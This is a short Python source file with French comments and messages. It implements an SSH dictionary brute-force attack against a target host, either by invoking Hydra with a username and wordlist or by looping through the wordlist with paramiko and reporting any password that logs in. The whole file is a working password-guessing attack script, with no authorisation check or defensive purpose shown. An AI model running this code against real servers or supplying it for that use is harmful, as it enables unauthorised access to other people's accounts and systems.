import paramiko
import subprocess

# Attaque par dictionnaire SSH

def brute_force_dictionnaire(target, username, wordlist, use_hydra=False, port=22, progress_callback=None, should_stop=None):
    def log(msg):
        if progress_callback:
            progress_callback(msg)
        else:
            print(msg)
    if use_hydra:
        log(f"Brute force dictionnaire sur {target}:{port} avec Hydra pour l'utilisateur {username} et wordlist {wordlist}")
        try:
            cmd = [
                "hydra", "-l", username, "-P", wordlist, target, "ssh", "-s", str(port)
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            log(result.stdout)
            if "login:" in result.stdout:
                log("Mot de passe trouvé !")
            else:
                log("Aucun mot de passe valide trouvé.")
        except Exception as e:
            log(f"Erreur lors de l'exécution d'Hydra : {e}")
    else:
        log(f"Brute force dictionnaire sur {target}:{port} avec paramiko pour l'utilisateur {username} et wordlist {wordlist}")
        try:
            with open(wordlist, 'r') as f:
                for password in f:
                    password = password.strip()
                    if should_stop and should_stop():
                        log("Attaque interrompue par l'utilisateur.")
                        return
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=username, password=password, timeout=2)
                        log(f"Mot de passe trouvé: {password}")
                        ssh.close()
                        return
                    except paramiko.AuthenticationException:
                        log(f"Echec avec: {password}")
                    except Exception as e:
                        log(f"Erreur: {e}")
            log("Mot de passe non trouvé dans le dictionnaire.")
        except Exception as e:
            log(f"Erreur d'ouverture du fichier: {e}")
